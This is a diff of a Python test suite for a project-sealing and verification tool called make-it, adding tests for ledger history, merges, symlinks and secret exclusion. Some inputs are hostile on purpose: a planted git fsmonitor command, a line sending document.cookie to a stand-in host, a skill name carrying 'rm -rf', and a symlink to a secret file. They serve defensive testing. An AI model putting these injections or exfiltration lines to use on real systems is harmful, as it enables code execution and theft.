@@ -52,12 +52,17 @@ class Base(unittest.TestCase):
         with open(self.p(".make-it/manifest.json")) as f:
             return json.load(f)
 
-    def write(self, *extra):
-        r = run("write", "--app", self.app, *extra)
+    def write(self, *extra, skill="make-it"):
+        """A make-it run finishing: it seals the project (which also writes the record)."""
+        r = run("seal", "--app", self.app, "--skill", skill, *extra)
         self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
         return r
 
-    def verify(self, *extra):
+    def verify(self, *extra, reseal=True):
+        """verify, by default after make-it sealed what the test just planted: that isolates the code and
+        file rules from the "changed outside make-it" rule, which class Seal tests with reseal=False."""
+        if reseal:
+            run("seal", "--app", self.app, "--skill", "resume-it")
         return run("verify", "--app", self.app, *extra)
 
     def edit(self, rel, text="\n# changed by hand\n"):
@@ -105,9 +110,9 @@ class Write(Base):
         self.edit(PERMS)
         r = run("note", "--app", self.app, PERMS, "AUDIT-002 missing check on export, commit abc1234")
         self.assertEqual(r.returncode, 0, r.stderr)
-        self.write()  # a later rewrite keeps both
+        self.write()  # a later seal keeps the note; results are that run's only, never inherited
         rec = self.record()
-        self.assertEqual(rec["security_results"]["deep_audit"], "ran")
+        self.assertEqual(rec["security_results"], {})
         e = [x for x in rec["security_files"] if x["path"] == PERMS][0]
         self.assertEqual(e["state"], "changed")
         self.assertIn("AUDIT-002", e["note"])
@@ -128,6 +133,329 @@ class Write(Base):
         self.assertEqual(r.returncode, 3, r.stdout + r.stderr)
         self.assertIn("could not be checked", r.stdout)
         self.assertEqual(self.verify("--allow-unlisted").returncode, 0)
+
+
+class Seal(Base):
+    """The seal: code that no longer matches what make-it sealed was changed outside make-it."""
+
+    OTHER = "backend/app/services/log_service.py"
+
+    def ledger(self):
+        return sorted(os.listdir(self.p(".make-it/ledger")))
+
+    def commit(self, msg="c"):
+        git(self.app, "add", "-A")
+        git(self.app, "commit", "-q", "-m", msg)
+
+    def test_a_sealed_project_passes_and_says_so_in_plain_words(self):
+        self.write()
+        r = self.verify(reseal=False)
+        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
+        self.assertEqual(len(self.ledger()), 1)
+        text = open(self.p("MAKE-IT.md")).read()
+        with open(os.path.join(ROOT, "VERSION")) as f:
+            self.assertIn(f"make-it {f.read().strip()}", text)
+        self.assertIn("/make-it", text)
+        self.assertIn("exactly as the release shipped", text)
+        self.assertIn("not proof", text)
+        stamp = json.load(open(self.p("backend/make-it-stamp.json")))
+        self.assertEqual(sorted(stamp), ["make_it_version", "scaffold", "schema", "security_files"])
+        self.assertIn("app/middleware/permissions.py", stamp["security_files"])
+        self.assertNotIn("frontend/lib/auth.tsx", stamp["security_files"])
+
+    def test_a_project_with_a_record_but_no_seal_fails(self):
+        r0 = run("write", "--app", self.app)
+        self.assertEqual(r0.returncode, 0)
+        r = self.verify(reseal=False)
+        self.assertEqual(r.returncode, 1)
+        self.assertIn("never been sealed", r.stdout)
+
+    def test_a_hand_edit_after_the_seal_fails_and_names_the_file(self):
+        self.write()
+        self.edit(self.OTHER)
+        r = self.verify(reseal=False)
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn(self.OTHER, r.stdout)
+        self.assertIn("outside make-it", r.stdout)
+        self.assertIn("/resume-it", r.stdout)
+
+    def test_a_new_or_removed_file_breaks_the_seal(self):
+        self.write()
+        with open(self.p("backend/app/extra_notes.py"), "w") as f:
+            f.write("X = 1\n")
+        r = self.verify(reseal=False)
+        self.assertEqual(r.returncode, 1)
+        self.assertIn("backend/app/extra_notes.py", r.stdout)
+        os.remove(self.p("backend/app/extra_notes.py"))
+        self.assertEqual(self.verify(reseal=False).returncode, 0)
+        os.remove(self.p(self.OTHER))
+        self.assertEqual(self.verify(reseal=False).returncode, 1)
+
+    def test_docs_can_change_without_breaking_the_seal(self):
+        self.write()
+        with open(self.p("README.md"), "a") as f:
+            f.write("\nmore words\n")
+        with open(self.p("docs-notes.MD"), "w") as f:
+            f.write("notes\n")
+        self.assertEqual(self.verify(reseal=False).returncode, 0)
+
+    def test_a_later_make_it_run_seals_the_change_and_adds_to_the_history(self):
+        self.write()
+        self.edit(self.OTHER)
+        self.write(skill="resume-it")
+        self.assertEqual(self.verify(reseal=False).returncode, 0)
+        names = self.ledger()
+        self.assertEqual(len(names), 2)
+        second = json.load(open(self.p(".make-it/ledger/" + names[1])))
+        self.assertEqual(second["skill"], "resume-it")
+        self.assertEqual(len(second["before"]), 1)
+        self.assertIn("| 2 |", open(self.p("MAKE-IT.md")).read())
+
+    def test_sealing_twice_with_no_change_adds_nothing(self):
+        self.write()
+        r = self.write(skill="resume-it")
+        self.assertIn("already sealed", r.stdout)
+        self.assertEqual(len(self.ledger()), 1)
+
+    def test_a_removed_or_edited_history_entry_fails(self):
+        self.write()
+        self.edit(self.OTHER)
+        self.write(skill="resume-it")
+        first, second = self.ledger()
+        keep = open(self.p(".make-it/ledger/" + first)).read()
+        os.remove(self.p(".make-it/ledger/" + first))
+        r = self.verify(reseal=False)
+        self.assertEqual(r.returncode, 1)
+        self.assertIn("history", r.stdout)
+        with open(self.p(".make-it/ledger/" + first), "w") as f:
+            f.write(keep.replace('"make-it"', '"resume-it"', 1))
+        r = self.verify(reseal=False)
+        self.assertEqual(r.returncode, 1)
+        self.assertIn("edited", r.stdout)
+        with open(self.p(".make-it/ledger/" + first), "w") as f:
+            f.write(keep)
+        self.assertEqual(self.verify(reseal=False).returncode, 0)
+
+    def test_a_damaged_history_is_not_sealed_over_without_saying_so(self):
+        self.write()
+        self.edit(self.OTHER)
+        self.write(skill="resume-it")
+        first, _ = self.ledger()
+        with open(self.p(".make-it/ledger/" + first), "a") as f:
+            f.write(" ")
+        r = run("seal", "--app", self.app, "--skill", "resume-it")
+        self.assertNotEqual(r.returncode, 0)
+        self.assertIn("--restart", r.stderr)
+        os.remove(self.p(".make-it/ledger/" + first))
+        r = run("seal", "--app", self.app, "--skill", "resume-it", "--restart", "an entry was lost in a bad merge")
+        self.assertEqual(r.returncode, 0, r.stderr)
+        self.assertEqual(self.verify(reseal=False).returncode, 0)
+        self.assertIn("history restarted: an entry was lost in a bad merge", open(self.p("MAKE-IT.md")).read())
+
+    def test_a_seal_copied_from_another_project_fails(self):
+        self.write()
+        other = os.path.join(self.tmp, "other")
+        os.makedirs(os.path.join(other, "src"))
+        with open(os.path.join(other, "src", "main.py"), "w") as f:
+            f.write("print('hand-written')\n")
+        shutil.copytree(self.p(".make-it"), os.path.join(other, ".make-it"))
+        git(other, "init", "-q", "-b", "main")
+        r = run("verify", "--app", other)
+        self.assertEqual(r.returncode, 1, r.stdout)
+
+    def test_a_squash_of_sealed_commits_still_passes(self):
+        self.write()
+        self.commit("build")
+        self.edit(self.OTHER)
+        self.write(skill="resume-it")
+        self.commit("change")
+        git(self.app, "reset", "-q", "--soft", "HEAD~1")
+        git(self.app, "commit", "-q", "--amend", "-m", "squashed")
+        self.assertEqual(self.verify(reseal=False).returncode, 0)
+
+    def test_two_sealed_branches_merged_fail_until_sealed_and_then_join(self):
+        self.write()
+        self.commit("base")
+        git(self.app, "checkout", "-q", "-b", "a")
+        self.edit(self.OTHER)
+        self.write(skill="resume-it")
+        self.commit("a")
+        git(self.app, "checkout", "-q", "main")
+        git(self.app, "checkout", "-q", "-b", "b")
+        self.edit("backend/app/services/__init__.py", "\n# b\n")
+        self.write(skill="fix-it")
+        self.commit("b")
+        m = subprocess.run(["git", "-C", self.app, "merge", "-q", "--no-edit", "a"], capture_output=True, text=True,
+                           env=dict(os.environ, GIT_AUTHOR_NAME="t", GIT_AUTHOR_EMAIL="t@t", GIT_COMMITTER_NAME="t", GIT_COMMITTER_EMAIL="t@t"))
+        if m.returncode != 0:  # only the generated files can clash; the history files never do
+            clash = git(self.app, "diff", "--name-only", "--diff-filter=U").stdout.split()
+            self.assertFalse([c for c in clash if c.startswith(".make-it/ledger/")], clash)
+            git(self.app, "checkout", "--theirs", "--", *clash)
+            self.commit("merge")
+        self.assertEqual(len(self.ledger()), 3)
+        self.assertEqual(self.verify(reseal=False).returncode, 1)
+        self.write(skill="resume-it")
+        self.assertEqual(self.verify(reseal=False).returncode, 0)
+        joined = json.load(open(self.p(".make-it/ledger/" + self.ledger()[-1])))
+        self.assertEqual(len(joined["before"]), 2)
+
+    def test_the_hook_keeps_the_record_but_never_seals(self):
+        self.write()
+        self.edit(self.OTHER)
+        subprocess.run([sys.executable, "-I", SCRIPT, "hook"], input=json.dumps({"cwd": self.app}), capture_output=True, text=True)
+        self.assertEqual(len(self.ledger()), 1)
+        self.assertEqual(self.verify(reseal=False).returncode, 1)
+
+    def test_seal_works_in_a_git_worktree(self):
+        self.write()
+        self.commit("base")
+        wt = os.path.join(self.tmp, "wt")
+        git(self.app, "worktree", "add", "-q", wt, "-b", "feature")
+        self.assertTrue(os.path.isfile(os.path.join(wt, ".git")))
+        self.assertEqual(run("verify", "--app", wt).returncode, 0)
+        with open(os.path.join(wt, self.OTHER), "a") as f:
+            f.write("\n# in the worktree\n")
+        self.assertEqual(run("verify", "--app", wt).returncode, 1)
+        self.assertEqual(run("seal", "--app", wt, "--skill", "resume-it").returncode, 0)
+        self.assertEqual(run("verify", "--app", wt).returncode, 0)
+
+    def test_a_planted_git_file_pointing_into_the_project_is_not_used(self):
+        self.write()
+        shutil.rmtree(self.p(".git"))
+        marker = os.path.join(self.tmp, "ran")
+        fake = self.p("gitstuff")
+        os.makedirs(os.path.join(fake, "objects"))
+        os.makedirs(os.path.join(fake, "refs", "heads"))
+        with open(os.path.join(fake, "HEAD"), "w") as f:
+            f.write("ref: refs/heads/main\n")
+        with open(os.path.join(fake, "config"), "w") as f:
+            f.write(f'[core]\n\tfsmonitor = touch {marker}\n\tbare = false\n')
+        with open(self.p(".git"), "w") as f:
+            f.write("gitdir: ./gitstuff\n")
+        self.verify(reseal=False)
+        run("seal", "--app", self.app, "--skill", "resume-it")
+        self.assertFalse(os.path.exists(marker))
+
+    def test_seal_never_writes_through_a_link(self):
+        victim = os.path.join(self.tmp, "victim")
+        os.makedirs(victim)
+        os.symlink(victim, self.p(".make-it/ledger"))
+        r = run("seal", "--app", self.app, "--skill", "make-it")
+        self.assertNotEqual(r.returncode, 0)
+        self.assertEqual(os.listdir(victim), [])
+        os.remove(self.p(".make-it/ledger"))
+        target = os.path.join(self.tmp, "target.md")
+        with open(target, "w") as f:
+            f.write("keep")
+        os.symlink(target, self.p("MAKE-IT.md"))
+        self.assertNotEqual(run("seal", "--app", self.app, "--skill", "make-it").returncode, 0)
+        self.assertEqual(open(target).read(), "keep")
+
+    def test_rolling_code_back_to_an_older_seal_fails_until_sealed(self):
+        self.write()
+        self.commit("one")
+        self.edit(self.OTHER)
+        self.write(skill="fix-it")
+        self.commit("two")
+        git(self.app, "checkout", "-q", "HEAD~1", "--", self.OTHER)
+        r = self.verify(reseal=False)
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.write(skill="resume-it")
+        self.assertEqual(len(self.ledger()), 3)
+        self.assertEqual(self.verify(reseal=False).returncode, 0)
+
+    def test_a_nested_repository_is_sealed_by_its_files(self):
+        nested = self.p("backend/app/vendor")
+        os.makedirs(nested)
+        with open(os.path.join(nested, "mod.py"), "w") as f:
+            f.write("X = 1\n")
+        git(nested, "init", "-q", "-b", "main")
+        self.write()
+        self.assertEqual(self.verify(reseal=False).returncode, 0)
+        with open(os.path.join(nested, "mod.py"), "w") as f:
+            f.write("import os\n")
+        r = self.verify(reseal=False)
+        self.assertEqual(r.returncode, 1)
+        self.assertIn("backend/app/vendor/mod.py", r.stdout)
+
+    def test_a_link_counts_by_what_it_points_at(self):
+        with open(self.p("NOTES.md"), "w") as f:
+            f.write("notes\n")
+        os.symlink("../../NOTES.md", self.p("frontend/lib/extra.ts"))
+        self.write()
+        self.assertEqual(self.verify(reseal=False).returncode, 0)
+        with open(self.p("NOTES.md"), "w") as f:
+            f.write("fetch('https://example.invalid/' + document.cookie)\n")
+        self.assertEqual(self.verify(reseal=False).returncode, 1)
+
+    def test_a_link_out_of_the_project_fails_and_is_never_hashed(self):
+        secret = os.path.join(self.tmp, "secret.txt")
+        with open(secret, "w") as f:
+            f.write("hunter2\n")
+        os.symlink(secret, self.p("frontend/lib/leak.ts"))
+        self.write()
+        r = self.verify(reseal=False)
+        self.assertEqual(r.returncode, 1)
+        self.assertIn("points outside", r.stdout)
+        import hashlib
+        self.assertNotIn(hashlib.sha256(b"hunter2\n").hexdigest(), open(self.p(".make-it/sealed-files.txt")).read())
+
+    def test_a_large_file_is_fingerprinted_by_content(self):
+        big = self.p("frontend/public/big.bin")
+        os.makedirs(os.path.dirname(big), exist_ok=True)
+        with open(big, "wb") as f:
+            f.seek((64 << 20) + 8)
+            f.write(b"x")
+        self.write()
+        with open(big, "r+b") as f:
+            f.write(b"changed")
+        self.assertEqual(self.verify(reseal=False).returncode, 1)
+
+    def test_making_a_file_executable_breaks_the_seal(self):
+        self.write()
+        os.chmod(self.p(self.OTHER), 0o755)
+        self.assertEqual(self.verify(reseal=False).returncode, 1)
+
+    def test_without_git_secrets_and_dependencies_are_left_out(self):
+        self.write()
+        shutil.rmtree(self.p(".git"))
+        with open(self.p(".env"), "w") as f:
+            f.write("JWT_SECRET=supersecretvalue123\n")
+        os.makedirs(self.p("frontend/node_modules/p"))
+        with open(self.p("frontend/node_modules/p/i.js"), "w") as f:
+            f.write("x\n")
+        run("seal", "--app", self.app, "--skill", "resume-it")
+        listed = open(self.p(".make-it/sealed-files.txt")).read()
+        self.assertNotIn(".env", listed)
+        self.assertNotIn("node_modules", listed)
+
+    def test_a_stray_dot_file_in_the_history_folder_is_ignored(self):
+        self.write()
+        with open(self.p(".make-it/ledger/.DS_Store"), "w") as f:
+            f.write("x")
+        self.assertEqual(self.verify(reseal=False).returncode, 0)
+
+    def test_seal_sets_the_git_settings_it_depends_on(self):
+        self.write()
+        attrs = open(self.p(".gitattributes")).read().splitlines()
+        for line in ("* -text", "MAKE-IT.md merge=union", "backend/make-it-stamp.json merge=union"):
+            self.assertIn(line, attrs)
+        self.assertEqual(self.verify(reseal=False).returncode, 0)
+
+    def test_a_project_inside_a_bigger_repository_uses_that_repository(self):
+        self.write()
+        shutil.rmtree(self.p(".git"))
+        git(self.tmp, "init", "-q", "-b", "main")
+        os.makedirs(self.p("frontend/node_modules/p"))
+        with open(self.p("frontend/node_modules/p/i.js"), "w") as f:
+            f.write("x\n")
+        run("seal", "--app", self.app, "--skill", "resume-it")
+        self.assertNotIn("node_modules", open(self.p(".make-it/sealed-files.txt")).read())
+        self.assertEqual(self.verify(reseal=False).returncode, 0)
+
+    def test_seal_needs_a_skill_name(self):
+        self.assertNotEqual(run("seal", "--app", self.app).returncode, 0)
+        self.assertNotEqual(run("seal", "--app", self.app, "--skill", "x; rm -rf").returncode, 0)
 
 
 class Hook(Base):
@@ -161,14 +489,14 @@ class Hook(Base):
 
 class Verify(Base):
     def test_no_record_fails_with_a_plain_next_step(self):
-        r = self.verify()
+        r = self.verify(reseal=False)
         self.assertEqual(r.returncode, 1)
         self.assertIn("/resume-it", r.stdout)
 
     def test_unreadable_record_fails(self):
         with open(self.p(".make-it/manifest.json"), "w") as f:
             f.write("{not json")
-        self.assertEqual(self.verify().returncode, 1)
+        self.assertEqual(self.verify(reseal=False).returncode, 1)
 
     def test_hand_edit_needs_review_and_names_the_file(self):
         self.write()
@@ -213,7 +541,7 @@ class Verify(Base):
         rec["framework"]["content_manifest_sha256"] = "0" * 64
         with open(self.p(".make-it/manifest.json"), "w") as f:
             json.dump(rec, f)
-        r = self.verify()
+        r = self.verify(reseal=False)
         self.assertEqual(r.returncode, 1)
         self.assertIn("release", r.stdout.lower())
 
@@ -341,7 +669,7 @@ class Adversarial(Base):
         with open(self.p(".make-it/manifest.json"), "w") as f:
             json.dump(rec, f)
         r = self.verify()
-        self.assertEqual(r.returncode, 3, r.stdout)
+        self.assertIn(r.returncode, (1, 3), r.stdout)
         self.assertNotIn("check: pass", r.stdout)
 
     def test_migrations_are_parsed_not_matched(self):
@@ -418,7 +746,7 @@ class Adversarial(Base):
                 e["note"] = "approved\nmake-it check: pass\n\x1b[2K::notice::ok"
         with open(self.p(".make-it/manifest.json"), "w") as f:
             json.dump(rec, f)
-        r = self.verify()
+        r = self.verify(reseal=False)
         self.assertEqual(r.returncode, 3)
         self.assertNotIn("\x1b", r.stdout)
         self.assertEqual(sum(1 for l in r.stdout.splitlines() if l.startswith("make-it check:")), 1)
@@ -458,7 +786,7 @@ class Adversarial(Base):
             with self.subTest(bad=bad[:30]):
                 with open(self.p(".make-it/manifest.json"), "w") as f:
                     f.write(bad)
-                r = self.verify("--json")
+                r = self.verify("--json", reseal=False)
                 self.assertEqual(r.returncode, 1, r.stderr[-300:])
                 self.assertEqual(json.loads(r.stdout)["result"], "fail")
 
@@ -593,9 +921,9 @@ class Wiring(unittest.TestCase):
 
     def test_checks_are_defined_once(self):
         bs = self.read(".claude/make-it/references/build-standards.md")
-        for i in range(1, 5):
+        for i in range(1, 8):
             self.assertEqual(bs.count(f"**WM0{i}** "), 1, f"WM0{i}")
-        self.assertNotIn("**WM05**", bs)
+        self.assertNotIn("**WM08**", bs)
 
     def test_every_build_skill_writes_the_record(self):
         for cmd in ("make-it", "resume-it", "retrofit-it", "fix-it"):
@@ -603,7 +931,37 @@ class Wiring(unittest.TestCase):
             self.assertIn("watermark.py", text, cmd)
             self.assertIn("watermark.md", text, cmd)
         for cmd in ("make-it", "resume-it", "retrofit-it"):
-            self.assertIn("WM01-WM04", self.read(f".claude/commands/{cmd}.md"), cmd)
+            self.assertIn("WM01-WM07", self.read(f".claude/commands/{cmd}.md"), cmd)
+
+    def test_every_skill_that_changes_a_project_seals_it(self):
+        for cmd in ("make-it", "resume-it", "retrofit-it", "fix-it", "deadcode-it", "argo-it", "try-it"):
+            text = self.read(f".claude/commands/{cmd}.md")
+            self.assertRegex(text, rf"watermark\.py\"? seal --skill {cmd}", cmd)
+
+    def test_wrap_it_and_the_hook_never_seal(self):
+        wrap = " ".join(self.read(".claude/commands/wrap-it.md").split())
+        self.assertRegex(wrap, r"(?i)never seals")
+        self.assertNotRegex(wrap, r"watermark\.py\"? seal")
+        spec = " ".join(self.read(".claude/make-it/references/watermark.md").split())
+        self.assertRegex(spec, r"(?i)hook .{0,80}never seals")
+
+    def test_spec_states_the_limit_in_plain_words(self):
+        spec = " ".join(self.read(".claude/make-it/references/watermark.md").split())
+        self.assertRegex(spec, r"(?i)attests\. it does not prove")
+        self.assertRegex(spec, r"(?i)by hand .{0,60}valid seal")
+
+    def test_scaffold_reports_the_stamp_to_admins_and_checks_in_ci(self):
+        about = self.read(".claude/make-it/scaffolds/fastapi-nextjs/backend/app/routers/about.py")
+        self.assertIn('Depends(require_permission("admin.settings", "read"))', about)
+        self.assertIn("make-it-stamp.json", about)
+        main = self.read(".claude/make-it/scaffolds/fastapi-nextjs/backend/app/main.py")
+        self.assertIn("about.router", main)
+        gate = self.read(".claude/make-it/scaffolds/fastapi-nextjs/.github/workflows/quality-gate.yml")
+        self.assertRegex(gate, r'watermark\.py"? verify')
+        self.assertIn("1.60.0", gate)
+        self.assertIn("pull_request.head.sha", gate)
+        page = self.read(".claude/make-it/scaffolds/fastapi-nextjs/frontend/app/(auth)/admin/settings/page.tsx")
+        self.assertIn("About this app", page)
 
     def test_spec_says_the_record_is_a_claim_and_is_written_silently(self):
         spec = " ".join(self.read(".claude/make-it/references/watermark.md").split())
